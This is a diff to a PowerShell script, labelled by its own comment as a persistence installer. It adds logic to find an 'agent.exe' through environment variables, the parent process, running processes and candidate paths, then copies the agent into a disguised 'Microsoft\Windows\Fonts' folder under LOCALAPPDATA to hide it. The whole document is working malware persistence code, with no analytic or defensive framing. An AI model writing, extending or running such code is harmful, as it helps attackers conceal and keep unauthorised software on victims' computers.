@@ -1,15 +1,60 @@
 $ProgressPreference = 'Continue'
 $ErrorActionPreference = 'Stop'
 
-$agentPath = $env:AgentPath
-if (-not $agentPath) {
-    Write-Output "ERROR: AgentPath environment variable not set."
+# -------------------------------------------------------------------
+# Function to get the agent path automatically
+# -------------------------------------------------------------------
+function Get-AgentPath {
+    # 1. Try environment variable first
+    if ($env:AgentPath -and (Test-Path $env:AgentPath)) {
+        Write-Output "[+] Using AgentPath from environment: $env:AgentPath"
+        return $env:AgentPath
+    }
+
+    # 2. Find parent process (the agent that launched this PowerShell)
+    try {
+        $parentPid = (Get-CimInstance -Class Win32_Process -Filter "ProcessId=$pid" | Select-Object -ExpandProperty ParentProcessId)
+        if ($parentPid) {
+            $parentPath = (Get-Process -Id $parentPid -ErrorAction Stop).Path
+            if ($parentPath -and (Test-Path $parentPath)) {
+                Write-Output "[+] Detected agent as parent process: $parentPath"
+                return $parentPath
+            }
+        }
+    } catch { }
+
+    # 3. Search for a running process named "agent.exe"
+    $proc = Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($proc) {
+        $procPath = $proc.Path
+        if ($procPath -and (Test-Path $procPath)) {
+            Write-Output "[+] Found running agent.exe at: $procPath"
+            return $procPath
+        }
+    }
+
+    # 4. Search common locations
+    $commonPaths = @(
+        "$env:TEMP\agent.exe",
+        "$env:LOCALAPPDATA\Microsoft\Windows\Fonts\agent.exe",
+        "$env:APPDATA\agent.exe"
+    )
+    foreach ($path in $commonPaths) {
+        if (Test-Path $path) {
+            Write-Output "[+] Found agent at common location: $path"
+            return $path
+        }
+    }
+
+    Write-Output "ERROR: Could not locate agent executable."
     exit 1
 }
-if (-not (Test-Path -LiteralPath $agentPath)) {
-    Write-Output "ERROR: Agent file not found at '$agentPath'"
-    exit 1
-}
+
+# -------------------------------------------------------------------
+# Main persistence installation
+# -------------------------------------------------------------------
+$agentPath = Get-AgentPath
+Write-Output "[+] Using agent: $agentPath"
 
 # --- 1. Hidden folder ---
 $hideDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
@@ -19,14 +64,12 @@ if (-not (Test-Path $hideDir)) {
     Write-Output "[+] Created hidden folder: $hideDir"
 }
 
-# --- 2. Copy agent directly (no ADS) ---
+# --- 2. Copy agent to hidden folder ---
 $agentFile = "$hideDir\agent.exe"
-# Remove any existing file first to avoid permission issues
 if (Test-Path $agentFile) {
     Remove-Item -Path $agentFile -Force -ErrorAction SilentlyContinue
 }
-Copy-Item -LiteralPath $agentPath -Destination $agentFile -Force -ErrorAction Stop
-# Verify copy succeeded
+Copy-Item -LiteralPath $agentPath -Destination $agentFile -Force
 if (-not (Test-Path $agentFile)) {
     Write-Output "ERROR: Failed to copy agent to $agentFile"
     exit 1
